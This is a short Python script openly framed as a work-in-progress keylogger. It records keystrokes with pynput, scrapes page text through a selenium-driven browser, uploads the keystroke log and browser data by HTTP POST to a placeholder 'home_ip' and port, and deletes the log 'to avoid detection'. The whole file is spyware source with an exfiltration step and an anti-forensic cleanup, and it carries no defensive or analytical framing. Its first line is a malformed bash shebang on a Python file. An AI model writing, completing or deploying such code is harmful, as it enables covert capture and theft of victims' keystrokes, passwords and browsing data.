##/bin/bash!  
# this program is still a work in progress feel free to add. 
import os
import requests
import platform
from pynput import keyboard
from bs4 import BeautifulSoup
from selenium import webdriver

# Define the target IP and port
home_ip = "your_home_ip"
port = "your_port"

# Function to log keystrokes
def on_press(key):
    try:
        with open("keystrokes.log", "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        pass

# Set up the keyboard listener
with keyboard.Listener(on_press=on_press) as listener:

    # Function to hook into the browser and extract data
    def extract_browser_data():
        browser_data = ""
        try:
            if platform.system() == "Windows":
                browser_path = "C:\\Program Files\\Internet Explorer\\iexplore.exe"
                browser = webdriver.Ie(browser_path)
            else:
                browser = webdriver.Firefox()
            
            browser.get("https://www.example.com")  # Replace with your target URL
            soup = BeautifulSoup(browser.page_source, 'html.parser')
            browser_data = soup.get_text()

        except Exception as e:
            pass
        
        finally:
            browser.quit()
            return browser_data

    # Collect browser data
    browser_data = extract_browser_data()

    # Send the gathered data to the home IP and port
    try:
        requests.post(f"http://{home_ip}:{port}/upload", files={'keystrokes.log': open('keystrokes.log', 'rb'), 'browser_data.txt': browser_data})
    except Exception as e:
        pass

    # Clean up and delete logs to avoid detection
    os.remove("keystrokes.log")

# Keep the script running
listener.join()